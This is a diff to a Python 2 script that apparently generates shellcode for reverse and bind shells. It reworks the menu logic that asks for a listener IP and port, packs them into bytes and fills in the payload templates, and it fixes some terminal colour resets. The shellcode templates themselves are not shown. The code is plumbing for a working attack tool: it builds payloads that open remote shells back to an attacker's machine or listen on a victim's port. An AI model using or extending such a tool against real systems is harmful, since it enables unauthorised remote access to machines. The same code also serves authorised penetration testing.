@@ -72,10 +72,9 @@ try:
             break
         else:
             print t.bold_red + '[*] Wrong Selection' + t.normal
-
     print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal
 
-    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
+    if menuchoice == '1' or menuchoice == '2':
         portnum = raw_input(
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
         if len(portnum) is 0:
@@ -87,31 +86,22 @@ try:
             if len(ipaddr) is 0:
                 ipaddr = IP
         else:
-            print t.bold_red + 'Error Getting Ip Automatically'
+            print t.bold_red + 'Error Getting Ip Automatically' + t.normal
             ipaddr = raw_input(
                 '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
         try:
-            if menuchoice == '4':
-                iphex = ipaddr
-            else:
-                ip1, ip2, ip3, ip4 = ipaddr.split('.')
-                iphex = struct.pack('BBBB', int(
-                    ip1), int(ip2), int(ip3), int(ip4))
+            ip1, ip2, ip3, ip4 = ipaddr.split('.')
+            iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
         except:
             print t.bold_red + '[*] Error in IP Syntax'
             sys.exit(1)
         try:
-            if menuchoice == '4':
-                porthex = struct.pack('<h', int(portnum))
-            else:
-                porthex = struct.pack('>h', int(portnum))
+            porthex = struct.pack('>h', int(portnum))
         except:
             print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
-        if menuchoice == '4':
-            shellcode = payloadchoice % (porthex, iphex)
-        else:
-            shellcode = payloadchoice % (iphex, porthex)
+
+        shellcode = payloadchoice % (iphex, porthex)
         print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
 
     elif menuchoice == '3':
@@ -122,10 +112,36 @@ try:
         try:
             bindporthex = struct.pack('>h', int(bindport))
         except:
-            print t.bold_red + '[*] Error in Port Syntax'
+            print t.bold_red + '[!] Error in Port Syntax' + t.normal
             sys.exit(1)
+
         shellcode = payloadchoice % (bindporthex)
         print t.bold_green + '\n[*] PORT SET AS %s\n' % (bindport) + t.normal
+
+    elif menuchoice == '4':
+        portnum = raw_input(
+            '\n[*] Press Enter For Default Port(443)\n[*] Port> ')
+        if len(portnum) is 0:
+            portnum = 443
+
+        if iperror == False:
+            ipaddr = raw_input(
+                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
+            if len(ipaddr) is 0:
+                ipaddr = IP
+        else:
+            print t.bold_red + 'Error Getting Ip Automatically' + t.normal
+            ipaddr = raw_input(
+                '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+        try:
+            porthex = struct.pack('<h', int(portnum))
+        except:
+            print t.bold_red + '[!] Error in Port Syntax' + t.normal
+            sys.exit(1)
+
+        iphex = ipaddr
+        shellcode = payloadchoice % (porthex, iphex)
+        print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
 
     elif menuchoice == '5':
         portnum = raw_input(
